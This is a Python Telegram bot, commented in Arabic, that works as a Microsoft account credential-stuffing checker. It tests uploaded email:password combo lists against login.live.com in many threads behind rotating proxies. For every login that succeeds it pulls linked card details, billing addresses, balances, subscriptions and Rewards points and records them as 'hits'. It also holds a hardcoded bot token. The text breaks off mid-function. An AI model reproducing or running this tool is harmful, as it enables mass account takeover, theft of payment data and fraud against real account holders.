# bot_microsoft_checker.py - نسخة الأزرار الكاملة
import requests
import re
import json
import threading
import queue
import sys
import os
import random
import time
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import logging
import asyncio
from urllib.parse import quote, unquote

# ==================== إعدادات البوت ====================
TOKEN = "8809628548:AAEJ8Tu2YZBPoowSHSLOpo5bk9iMSejlXaY"  # ضع توكن البوت هنا
ADMIN_ID = "8388151950"  # معرفك للتحكم الكامل

# ==================== إعدادات الفحص ====================
HDRMax = 20
HDRTimeOut = 15
HDRMaxPer = 100

stats = {
    "hits": 0,
    "bad": 0,
    "two_factor": 0,
    "checked": 0,
    "total_combos": 0,
    "proxy_errors": 0,
    "accounts_with_cc": 0,
    "accounts_with_balance": 0,
    "accounts_with_subscription": 0,
    "accounts_with_points": 0,
    "start_time": time.time()
}

HDRStatusL = threading.Lock()
HDROutput = threading.Lock()

# متغيرات جلسات الفحص
scan_active = False
combo_queue = queue.Queue()
proxy_list = []
results_hits = []
results_details = []
active_chats = set()

# ==================== إعدادات البوت الثابتة ====================
HDRPPFT = "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
HDRBK = "1665024852"
HDRUAID = "a5b22c26bc704002ac309462e8d061bb"

# ==================== دوال الفحص الأساسية ====================
def HDR(source_text, left_str, right_str, var_name, variables, create_empty=True, prefix="", suffix=""):
    try:
        match = re.search(f"{re.escape(left_str)}(.*?){re.escape(right_str)}", source_text, re.DOTALL)
        if match:
            value = match.group(1)
            variables[var_name] = f"{prefix}{value}{suffix}"
            return True
        else:
            if create_empty:
                variables[var_name] = ""
            return False
    except Exception:
        if create_empty:
            variables[var_name] = ""
        return False

def HDRJsonKey(source_text, key, var_name, variables, create_empty=True, prefix="", suffix=""):
    try:
        data = json.loads(source_text)
        if key in data:
            value = data[key]
            variables[var_name] = f"{prefix}{value}{suffix}"
            return True
        else:
            if create_empty:
                variables[var_name] = ""
            return False
    except json.JSONDecodeError:
        if create_empty:
            variables[var_name] = ""
        return False
    except Exception:
        if create_empty:
            variables[var_name] = ""
        return False

def HDRRetries(session, method, url, step_name, retries_counter_list, **kwargs):
    for attempt in range(HDRMaxPer + 1):
        try:
            response = session.request(method, url, timeout=HDRTimeOut, **kwargs)
            return response
        except (requests.exceptions.ProxyError, requests.exceptions.SSLError) as e:
            if retries_counter_list:
                 retries_counter_list[0] +=1
            raise
        except requests.exceptions.RequestException as e:
            if attempt < HDRMaxPer:
                if retries_counter_list:
                    retries_counter_list[0] += 1
                time.sleep(1 + attempt)
                continue
            else:
                raise
    return None

def HDRChkAccount(user_pass_line, proxy_dict_for_session):
    user, password = user_pass_line.split(':', 1)
    
    variables = {'USER': user, 'PASS': password}
    captures = {}
    current_status_internal = "UNKNOWN_INIT"
    account_retry_attempts = [0]

    session = requests.Session()
    if proxy_dict_for_session:
        session.proxies = proxy_dict_for_session
    try:
        url_login = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={quote(user)}&contextid=2CCDB02DC526CA71&bk={HDRBK}&uaid={HDRUAID}&pid=15216"
        
        payload_login_template = "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>"
        payload_login = payload_login_template.replace("<USER>", user).replace("<PASS>", password).replace("{ppft}", HDRPPFT)

        headers_login = {
            "Host": "login.live.com",
            "Cache-Control": "max-age=0",
            "sec-ch-ua": "\"Microsoft Edge\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid={HDRUAID}&display=touch&username={quote(user)}",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": "CAW=%3CEncryptedData%20xmlns%3D%22http://www.w3.org/2001/04/xmlenc%23%22%20Id%3D%22BinaryDAToken1%22%20Type%3D%22http://www.w3.org/2001/04/xmlenc%23Element%22%3E%3CEncryptionMethod%20Algorithm%3D%22http://www.w3.org/2001/04/xmlenc%23tripledes-cbc%22%3E%3C/EncryptionMethod%3E%3Cds:KeyInfo%20xmlns:ds%3D%22http://www.w3.org/2000/09/xmldsig%23%22%3E%3Cds:KeyName%3Ehttp://Passport.NET/STS%3C/ds:KeyName%3E%3C/ds:KeyInfo%3E%3CCipherData%3E%3CCipherValue%3EM.C534_BAY.0.U.CqFsIZLJMLjYZcShFFeq37gPy/ReDTOxI578jdvIQe34OFFxXwod0nSinliq0/kVdaZSdVum5FllwJWBbzH7LQqQlNIH4ZRpA4BmNDKVZK9APSoJ%2BYNEFX7J4eX4arCa69y0j3ebxxB0ET0%2B8JKNwx38dp9htv/fQetuxQab47sTb8lzySoYn0RZj/5NRQHRFS3PSZb8tSfIAQ5hzk36NsjBZbC7PEKCOcUkePrY9skUGiWstNDjqssVmfVxwGIk6kxfyAOiV3on%2B9vOMIfZZIako5uD3VceGABh7ZxD%2BcwC0ksKgsXzQs9cJFZ%2BG1LGod0mzDWJHurWBa4c0DN3LBjijQnAvQmNezBMatjQFEkB4c8AVsAUgBNQKWpXP9p3pSbhgAVm27xBf7rIe2pYlncDgB7YCxkAndJntROeurd011eKT6/wRiVLdym6TUSlUOnMBAT5BvhK/AY4dZ026czQS2p4NXXX6y2NiOWVdtDyV51U6Yabq3FuJRP9PwL0QA%3D%3D%3C/CipherValue%3E%3C/CipherData%3E%3C/EncryptedData%3E;DIDC=ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1;DIDCL=ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1;MSPRequ=id=N&lt=1716398680&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-175ae920-bd12-4d7c-ad6d-9b92a6818f89; OParams=11O.DlK9hYdFfivp*0QoJiYT2Qy83kFNo*ZZTQeuvQ0LQzYIADO3zbs*Hic1wfggJcJ6IjaSW0uhkJA2V2qHoF6Uijtl4S917NbRSYxGy0zbqEYtcXAlWZZCQUyVeRoEZT9xiChsk8JTXV2xPusIXRCRpyflM376GGcjUFMaQZuR6PPITnzwgJTeCj6iMAXKEyR5ougzXlltimdTufqAZLwLiC8a8U2ifLfQXP6ibI2Uk!8vBkegcZ73OpR2J2XPd0XeNEt7zVuUQnsbzmSKT3QetSepbGHhx*bkq8c0KyMZcq08dnJVvcPGwI2NNnN3hI1kytasvECwkKYbPIzVX*cA8jbyVqsQRoGWMTr7gGB4Z5BDteRuWO8tuVBRpn9spWtoBQv5CqOvPptW7kV0n1jrYxU$; MicrosoftApplicationsTelemetryDeviceId=49a10983-52d4-43ed-9a94-14ac360a5683; ai_session=K/6T8kGCWbit7HtaRqLso3|1716398680878|1716398680878; MSFPC=GUID=09547181a6984b52ad37278edb4b6ee6&HASH=0954&LV=202405&V=4&LU=1714868413949"
        }
        
        response_login = HDRRetries(session, 'POST', url_login, "Login", account_retry_attempts, headers=headers_login, data=payload_login, allow_redirects=True)
        if not response_login: return "NETWORK_ERROR_LOGIN", None, account_retry_attempts[0]
        response_text = response_login.text
        response_url = response_login.url

        if "Your account or password is incorrect." in response_text or \
           "That Microsoft account doesn\\'t exist. Enter a different account" in response_text or \
           ("Sign in to your Microsoft account" in response_text and "oauth20_desktop.srf#access_token=" not in response_url and "oauth20_desktop.srf?" not in response_url):
            current_status_internal = "FAILURE_CREDENTIALS"
        elif ",AC:null,urlFedConvertRename" in response_text:
            current_status_internal = "BAN_LOCKED"
        elif "timed out" in response_text.lower():
            current_status_internal = "FAILURE_TIMEOUT_MSG"
        elif "account.live.com/recover" in response_text or "account.live.com/identity/confirm" in response_text or "Email/Confirm" in response_text:
            current_status_internal = "2FACTOR_VERIFICATION"
        elif "/cancel?mkt=" in response_text or "/Abuse?mkt=" in response_text:
            current_status_internal = "CUSTOM_LOCK_ABUSE"
        else:
            success_cookie_found = any(cookie.name in ["ANON", "WLSSC"] for cookie in session.cookies)
            successful_redirect = "oauth20_desktop.srf#access_token=" in response_url or "https://login.live.com/oauth20_desktop.srf?" in response_url
            
            if successful_redirect or success_cookie_found:
                current_status_internal = "SUCCESS_LOGIN_STEP"
            elif response_login.status_code == 200 and "https://login.live.com/ppsecure/post.srf" in response_url and not success_cookie_found:
                current_status_internal = "FAILURE_LOGIN_UNKNOWN_STUCK_ON_POST"
            else:
                current_status_internal = "FAILURE_LOGIN_UNKNOWN"

    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, account_retry_attempts[0]
    except requests.exceptions.RequestException:
        return "NETWORK_ERROR_LOGIN", None, account_retry_attempts[0]
    if current_status_internal != "SUCCESS_LOGIN_STEP":
        if current_status_internal == "FAILURE_CREDENTIALS": return "BAD_CREDENTIALS", None, account_retry_attempts[0]
        if current_status_internal == "2FACTOR_VERIFICATION": return "2FA_REQUIRED", None, account_retry_attempts[0]
        if current_status_internal in ["BAN_LOCKED", "CUSTOM_LOCK_ABUSE"]: return "ACCOUNT_ISSUE", None, account_retry_attempts[0]
        return "LOGIN_FAILED_OTHER", None, account_retry_attempts[0]
    try:
        url_oauth_auth = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none"
        headers_oauth_auth = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": "https://account.microsoft.com/"
        }
        response_oauth_auth = HDRRetries(session, 'GET', url_oauth_auth, "OAuth", account_retry_attempts, headers=headers_oauth_auth, allow_redirects=True)
        if not response_oauth_auth: return "NETWORK_ERROR_OAUTH", None, account_retry_attempts[0]

        token_found_in_url = False
        if "access_token=" in response_oauth_auth.url:
            if HDR(response_oauth_auth.url, "access_token=", "&token_type", "Token", variables):
                token_found_in_url = True
        
        if not token_found_in_url:
            return "TOKEN_ERROR_OAUTH_PARSE", None, account_retry_attempts[0]
        
        if variables.get("Token"):
            variables["Token_decoded"] = unquote(variables["Token"])
        else:
            return "TOKEN_ERROR_OAUTH_MISSING", None, account_retry_attempts[0]
    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, account_retry_attempts[0]
    except requests.exceptions.RequestException:
        return "NETWORK_ERROR_OAUTH", None, account_retry_attempts[0]
    payment_api_response_status = "UNKNOWN_PAYMENT_API"
    try:
        if not variables.get("Token"):
            return "TOKEN_ERROR_MISSING_FOR_PAYMENT", None, account_retry_attempts[0]
        url_payment_instruments = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
        headers_payment_instruments = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": f"MSADELEGATE1.0=\"{variables['Token']}\"",
            "Content-Type": "application/json",
            "Host": "paymentinstruments.mp.microsoft.com",
            "Origin": "https://account.microsoft.com",
            "Referer": "https://account.microsoft.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
        }
        response_payment_instruments = HDRRetries(session, 'GET', url_payment_instruments, "PaymentInstruments", account_retry_attempts, headers=headers_payment_instruments)
        if not response_payment_instruments: return "NETWORK_ERROR_PAYMENT_INSTRUMENTS", None, account_retry_attempts[0]
        payment_data_text = response_payment_instruments.text
        if response_payment_instruments.status_code == 200:
            HDR(payment_data_text, 'balance":', ',"', "Balance", variables, prefix="$")
            
            if HDR(payment_data_text, 'paymentMethodFamily":"credit_card","display":{"name":"', '"', "CardTypeLast4", variables):
                card_info = variables.get("CardTypeLast4", "")
                HDR(payment_data_text, 'expirationMonth":', ',"', "ExpMonth", variables)
                HDR(payment_data_text, 'expirationYear":', ',"', "ExpYear", variables)
                HDR(payment_data_text, 'firstSixDigits":', ',"', "FirstSix", variables)
            
            HDR(payment_data_text, 'accountHolderName":"', '","', "AccountHolderName", variables)
            HDR(payment_data_text, '"postal_code":"', '",', "Zipcode", variables)
            HDR(payment_data_text, '"region":"', '",', "Region", variables)
            HDR(payment_data_text, '"address_line1":"', '",', "Address1", variables)
            HDR(payment_data_text, '"city":"', '",', "City", variables)
            captures["Address"] = f"[ Address: {variables.get('Address1', 'N/A')}, City: {variables.get('City', 'N/A')}, State: {variables.get('Region', 'N/A')}, Postalcode: {variables.get('Zipcode', 'N/A')} ]"
            
            if variables.get("CardTypeLast4"):
                card_details = variables.get("CardTypeLast4", "")
                if variables.get("FirstSix"):
                    card_details = f"{variables.get('FirstSix')}******{card_details[-4:]}" if len(card_details) >= 4 else card_details
                if variables.get("ExpMonth") and variables.get("ExpYear"):
                    card_details += f" | Exp: {variables.get('ExpMonth')}/{variables.get('ExpYear')}"
                variables["FullCardDetails"] = card_details
            
            if not variables.get("CardTypeLast4") and not variables.get("Balance"):
                payment_api_response_status = "SUCCESS_PAYMENT_NO_INFO"
            else:
                payment_api_response_status = "SUCCESS_PAYMENT_INFO"
        elif response_payment_instruments.status_code == 401:
            return "PAYMENT_API_ERROR_UNAUTHORIZED", None, account_retry_attempts[0]
        else:
            return "PAYMENT_API_ERROR_OTHER", None, account_retry_attempts[0]

    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, account_retry_attempts[0]
    except requests.exceptions.RequestException:
        return "NETWORK_ERROR_PAYMENT_INSTRUMENTS", None, account_retry_attempts[0]
    transaction_api_response_status = "SKIPPED_TRANSACTIONS"
    if payment_api_response_status in ["SUCCESS_PAYMENT_INFO", "SUCCESS_PAYMENT_NO_INFO"]:
        try:
            url_payment_transactions = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
            headers_payment_transactions = headers_payment_instruments
            response_payment_transactions = HDRRetries(session, 'GET', url_payment_transactions, "PaymentTransactions", account_retry_attempts, headers=headers_payment_transactions)
            if not response_payment_transactions: return "NETWORK_ERROR_TRANSACTIONS", None, account_retry_attempts[0]

            transactions_data_text = response_payment_transactions.text
            if response_payment_transactions.status_code == 200:
                HDR(transactions_data_text, 'country":"', '"}', "Country", variables)
                HDR(transactions_data_text, 'title":"', '",', "Item 1", variables)
                HDR(transactions_data_text, '"autoRenew":', ',', "autoRenew", variables)
                HDR(transactions_data_text, '"startDate":"', 'T', "startDate", variables)
                HDR(transactions_data_text, '"nextRenewalDate":"', 'T', "nextRenewalDate", variables)
                HDR(transactions_data_text, 'description":"', '",', "TransactionDescription", variables)
                HDRJsonKey(transactions_data_text, "quantity", "Quantity_json", variables)
                HDRJsonKey(transactions_data_text, "currency", "CURRENCY", variables)
                temp_total_amount = {}
                if HDRJsonKey(transactions_data_text, "totalAmount", "totalAmount_json", temp_total_amount):
                     variables["totalAmount_json_formatted"] = f"{variables.get('CURRENCY','')} {temp_total_amount['totalAmount_json']}"
                
                transaction_api_response_status = "SUCCESS_TRANSACTIONS_PARSED"

            elif response_payment_transactions.status_code == 401:
                 return "TRANSACTION_API_ERROR_UNAUTHORIZED", None, account_retry_attempts[0]
            else:
                 return "TRANSACTION_API_ERROR_OTHER", None, account_retry_attempts[0]
        
        except requests.exceptions.ProxyError:
            return "PROXY_ERROR", None, account_retry_attempts[0]
        except requests.exceptions.RequestException:
            return "NETWORK_ERROR_TRANSACTIONS", None, account_retry_attempts[0]    
    try:
        url_rewards = "https://rewards.bing.com/"
        headers_rewards = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
        }
        response_rewards = HDRRetries(session, 'GET', url_rewards, "Rewards", account_retry_attempts, headers=headers_rewards, allow_redirects=True)
        if response_rewards:
            rewards_data_text = response_rewards.text
            if HDR(rewards_data_text, ',"availablePoints":', ',"', "points_val", variables, create_empty=False):
                captures["points"] = variables["points_val"]
                stats['accounts_with_points'] += 1
            elif HDR(rewards_data_text, 'pointsAvailable":', ',', "points_val", variables, create_empty=False):
                captures["points"] = variables["points_val"]
                stats['accounts_with_points'] += 1
            else:
                captures["points"] = "N/A"
        else:
            captures["points"] = "N/A (Error)"

    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, account_retry_attempts[0]
    except requests.exceptions.RequestException:
        captures["points"] = "N/A (Error)"
    if payment_api_response_status.startswith("SUCCESS") or transaction_api_response_status.startswith("SUCCESS_TRANSACTIONS_PARSED"):
        country = variables.get("Country", "N/A")
        acc_holder_name_val = variables.get("AccountHolderName", "")
        
        if variables.get("FullCardDetails"):
            card_holder_name_str = f"{acc_holder_name_val} | Card: {variables.get('FullCardDetails')}" if acc_holder_name_val else f"Card: {variables.get('FullCardDetails')}"
            stats['accounts_with_cc'] += 1
        else:
            card_holder_name_str = acc_holder_name_val if acc_holder_name_val and acc_holder_name_val != "N/A" else "No CC Linked"
        
        cc_funding = variables.get("Balance", "N/A")
        if cc_funding != "N/A" and cc_funding != "$0.0":
            cc_funding = f"{cc_funding} (Credit Available)"
            stats['accounts_with_balance'] += 1
        
        item1 = variables.get("Item 1", "N/A")
        purchased_items_str = f"[{item1}]" if item1 != "N/A" else "[N/A]"
        if item1 != "N/A":
            stats['accounts_with_subscription'] += 1
            
        auto_renew_val = variables.get("autoRenew", "N/A").lower()
        auto_renew_str = "Yes" if auto_renew_val == "true" else ("No" if auto_renew_val == "false" else "N/A")
        
        start_date = variables.get("startDate", "N/A")
        end_date = variables.get("nextRenewalDate", "N/A")
        points = captures.get("points", "N/A")
        
        hit_string = (
            f"{user_pass_line} | Country = {country} | CardHolder = {card_holder_name_str} | "
            f"CC Funding = {cc_funding} | Purchased Items = {purchased_items_str} | "
            f"Auto Renew = {auto_renew_str} | Start in = {start_date} | End in = {end_date} | "
            f"Points = {points} | by = @id11tt"
        )
        
        hit_details = {
            "email": user,
            "password": password,
            "country": country,
            "card_holder": acc_holder_name_val,
            "card_details": variables.get("FullCardDetails", "N/A"),
            "balance": variables.get("Balance", "N/A"),
            "purchased_items": item1,
            "auto_renew": auto_renew_str,
            "start_date": start_date,
            "end_date": end_date,
            "points": points,
            "source": "@id11tt"
        }
        
        global results_hits, results_details
        results_hits.append(hit_string)
        results_details.append(hit_details)
        
        return "HIT", hit_string, account_retry_attempts[0]
    else:
        return "POST_LOGIN_FAILURE_NO_DATA", None, account_retry_attempts[0]

def worker(combo_queue_local, proxy_list_local):
    global scan_active
    while scan_active:
        try:
            user_pass = combo_queue_local.get_nowait()
        except queue.Empty:
            break

        HDRPrxxy2 = None
        if proxy_list_local:
            proxy_url = random.choice(proxy_list_local)
            HDRPrxxy2 = {'http': proxy_url, 'https': proxy_url}

        final_status, hit_data_str, retries_for_account = HDRChkAccount(user_pass, HDRPrxxy2)
        
        with HDRStatusL:
            stats['checked'] += 1

            if final_status == "HIT":
                stats['hits'] += 1
            elif final_status == "BAD_CREDENTIALS":
                stats['bad'] += 1
            elif final_status == "2FA_REQUIRED":
                stats['two_factor'] += 1
            elif final_status == "PROXY_ERROR":
                stats['proxy_errors'] += 1

        combo_queue_local.task_done()

# ==================== أزرار البوت ====================

def get_main_keyboard():
    """القائمة الرئيسية للأزرار"""
    keyboard = [
        [
            InlineKeyboardButton("🚀 بدء الفحص", callback_data='start_scan'),
            InlineKeyboardButton("⏹ إيقاف", callback_data='stop_scan')
        ],
        [
            InlineKeyboardButton("📊 إحصائيات", callback_data='stats'),
            InlineKeyboardButton("📥 تحميل النتائج", callback_data='download_results')
        ],
        [
            InlineKeyboardButton("📤 رفع كومبو", callback_data='upload_combo'),
            InlineKeyboardButton("🌐 رفع بروكسي", callback_data='upload_proxy')
        ],
        [
            InlineKeyboardButton("🗑 مسح الكل", callback_data='clear_results'),
            InlineKeyboardButton("ℹ️ مساعدة", callback_data='help')
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_back_keyboard():
    """زر العودة للقائمة الرئيسية"""
    keyboard = [[InlineKeyboardButton("🔙 العودة للقائمة", callback_data='main_menu')]]
    return InlineKeyboardMarkup(keyboard)

# ==================== أوامر وأزرار البوت ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر البدء - يعرض الأزرار"""
    chat_id = update.effective_chat.id
    active_chats.add(chat_id)
    
    status_text = "🟢 نشط" if scan_active else "🔴 متوقف"
    
    await update.message.reply_text(
        f"🔥 *Microsoft Account Checker Bot*\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"👤 الكومبو: {stats['total_combos']}\n"
        f"✅ تم الفحص: {stats['checked']}\n"
        f"🎯 الإصابات: {stats['hits']}\n"
        f"❌ فاشل: {stats['bad']}\n"
        f"📌 الحالة: {status_text}\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"📌 اختر أحد الخيارات أدناه:",
        reply_markup=get_main_keyboard(),
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالج جميع الأزرار"""
    query = update.callback_query
    await query.answer()
    
    chat_id = update.effective_chat.id
    user_id = str(query.from_user.id)
    
    global scan_active, combo_queue, proxy_list, results_hits, results_details
    
    # ========== زر: القائمة الرئيسية ==========
    if query.data == 'main_menu':
        status_text = "🟢 نشط" if scan_active else "🔴 متوقف"
        await query.edit_message_text(
            f"🔥 *Microsoft Account Checker Bot*\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"👤 الكومبو: {stats['total_combos']}\n"
            f"✅ تم الفحص: {stats['checked']}\n"
            f"🎯 الإصابات: {stats['hits']}\n"
            f"❌ فاشل: {stats['bad']}\n"
            f"📌 الحالة: {status_text}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"📌 اختر أحد الخيارات أدناه:",
            reply_markup=get_main_keyboard(),
            parse_mode='Markdown'
        )
        return
    
    # ========== زر: بدء الفحص ==========
    if query.data == 'start_scan':
        if scan_active:
            await query.edit_message_text(
                "⚠️ *فحص قيد التشغيل بالفعل!*",
                reply_markup=get_back_keyboard(),
                parse_mode='Markdown'
            )
            return
        
        if combo_queue.empty():
            await query.edit_message_text(
                "❌ *لا توجد كومبو للفحص!*\n"
                "📤 استخدم زر 'رفع كومبو' لتحميل ملف.",
                reply_markup=get_back_keyboard(),
                parse_mode='Markdown'
            )
            return
        
        scan_active = True
        
        # إعادة تشغيل الإحصائيات
        with HDRStatusL:
            stats['start_time'] = time.time()
            stats['checked'] = 0
            stats['hits'] = 0
            stats['bad'] = 0
            stats['two_factor'] = 0
            stats['proxy_errors'] = 0
            stats['accounts_with_cc'] = 0
            stats['accounts_with_balance'] = 0
            stats['accounts_with_subscription'] = 0
            stats['accounts_with_points'] = 0
        
        results_hits = []
        results_details = []
        
        await query.edit_message_text(
            f"🔄 *جاري بدء الفحص...*\n"
            f"📦 عدد الكومبو: {stats['total_combos']}\n"
            f"🌐 عدد البروكسيات: {len(proxy_list)}",
            reply_markup=get_back_keyboard(),
            parse_mode='Markdown'
        )
        
        # تشغيل الفحص في خيط منفصل
        def run_scan():
            global scan_active
            worker_count = min(HDRMax, stats['total_combos'])
            threads = []
            for _ in range(worker_count):
                t = threading.Thread(target=worker, args=(combo_queue, proxy_list))
                t.daemon = True
                threads.append(t)
                t.start()
            
            while scan_active and stats['checked'] < stats['total_combos']:
                if combo_queue.empty() and all(not t.is_alive() for t in threads):
                    break
                time.sleep(0.2)
            
            scan_active = False
            asyncio.run_coroutine_threadsafe(
                query.message.reply_text(
                    f"✅ *اكتمل الفحص!*\n"
                    f"🎯 الإصابات: {stats['hits']}\n"
                    f"📥 استخدم زر 'تحميل النتائج'",
                    reply_markup=get_main_keyboard(),
                    parse_mode='Markdown'
                ),
                context.application.loop
            )
        
